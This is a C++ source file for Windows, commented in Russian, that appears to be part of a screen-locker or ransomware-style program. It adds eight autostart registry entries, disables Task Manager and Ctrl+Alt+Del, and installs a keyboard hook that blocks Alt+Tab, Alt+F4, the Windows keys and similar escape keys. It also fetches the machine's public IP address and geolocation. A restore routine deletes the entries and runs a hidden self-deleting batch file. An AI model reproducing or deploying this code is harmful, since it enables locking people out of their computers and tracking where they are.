#include <windows.h>
#include <string>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma warning(disable: 4996)

using namespace std;

bool blockKeys = true;
HHOOK keyboardHook = NULL;

// Добавляем в автозагрузку
void AddToStartup() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        for (int i = 1; i <= 8; i++) {
            string valueName = "WIN32_" + to_string(i);
            RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, (BYTE*)exePath, (DWORD)strlen(exePath) + 1);
        }
        RegCloseKey(hKey);
    }
}

// ПОЛНОЕ ВОССТАНОВЛЕНИЕ СИСТЕМЫ
void FullSystemRestore() {
    HKEY hKey;
    
    // 1. Удаляем все записи автозагрузки WIN32_1...WIN32_8
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        for (int i = 1; i <= 8; i++) {
            string valueName = "WIN32_" + to_string(i);
            RegDeleteValueA(hKey, valueName.c_str());
        }
        RegCloseKey(hKey);
    }
    
    // 2. Удаляем специфические записи из Run
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsInstaller");
        RegDeleteValueA(hKey, "MSEDeplUpdateX");
        RegDeleteValueA(hKey, "WindowsSecurityUpdate");
        RegCloseKey(hKey);
    }
    
    // 3. Очищаем RunOnce
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "System3264Wow");
        RegDeleteValueA(hKey, "OneDrive10293");
        RegDeleteValueA(hKey, "WINDOWS");
        RegDeleteValueA(hKey, "Shell");
        RegCloseKey(hKey);
    }
    
    // 4. Очищаем Winlogon
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "Shell");
        RegCloseKey(hKey);
    }
    
    // 5. Очищаем Explorer RunMRU
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "MRUList");
        RegCloseKey(hKey);
    }
    
    // 6. Удаляем сам файл программы
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    string batPath = string(tempPath) + "_cleanup.bat";
    
    FILE* bat = fopen(batPath.c_str(), "w");
    if (bat) {
        fprintf(bat, "@echo off\n");
        fprintf(bat, "timeout /t 2 /nobreak > nul\n");
        fprintf(bat, "del /f /q \"%s\"\n", exePath);
        fprintf(bat, "del /f /q \"%s\"\n", batPath.c_str());
        fclose(bat);
        ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_HIDE);
    }
    
    // 7. Запускаем Explorer
    ShellExecuteA(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOWNORMAL);
}

void DisableCtrlAltDel() {
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    DWORD value = 1;
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
    RegCloseKey(hKey);
    
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    DWORD disableCAD = 1;
    RegSetValueExA(hKey, "DisableCAD", 0, REG_DWORD, (BYTE*)&disableCAD, sizeof(DWORD));
    RegCloseKey(hKey);
}

void EnableCtrlAltDel() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "DisableTaskMgr");
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "DisableCAD");
        RegCloseKey(hKey);
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && blockKeys) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if ((p->vkCode == VK_TAB) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if ((p->vkCode == VK_F4) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) return 1;
        if ((p->vkCode == VK_ESCAPE) && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1;
        if ((p->vkCode == VK_ESCAPE) && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) return 1;
        if (p->vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

string GetRealIP() {
    HINTERNET hNet = InternetOpenA("IPChecker", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hNet) return "Не удалось определить";
    HINTERNET hUrl = InternetOpenUrlA(hNet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hNet);
        return "Не удалось определить";
    }
    char buffer[32] = {0};
    DWORD bytesRead = 0;
    InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    string ip = buffer;
    return ip.empty() ? "Не удалось определить" : ip;
}

string GetGeoLocation(const string& ip) {
    if (ip == "Не удалось определить") return "Неизвестно";
    HINTERNET hNet = InternetOpenA("GeoChecker", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hNet) return "Неизвестно";
    string url = "http://ip-api.com/json/" + ip + "?fields=country,city,isp";
    HINTERNET hUrl = InternetOpenUrlA(hNet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hNet);
        return "Неизвестно";
    }
    char buffer[1024] = {0};
    DWORD bytesRead = 0;
    InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    string response = buffer;
    string country, city, isp;
    size_t pos = response.find("\"country\":\"");
    if (pos != string::npos) {
        pos += 11;
        size_t end = response.find("\"", pos);
        country = response.substr(pos, end - pos);
    }
    pos = response.find("\"city\":\"");
    if (pos != string::npos) {
        pos += 8;
        size_t end = response.find("\"", pos);
        city = response.substr(pos, end - pos);
    }
    pos = response.find("\"isp\":\"");
    if (pos != string::npos) {
        pos += 7;
        size_t end = response.find("\"", pos);
        isp = response.substr(pos, end - pos);
    }
    if (country.empty() && city.empty()) return "Неизвестно";
    return country + ", " + city + " (" + isp + ")";
}

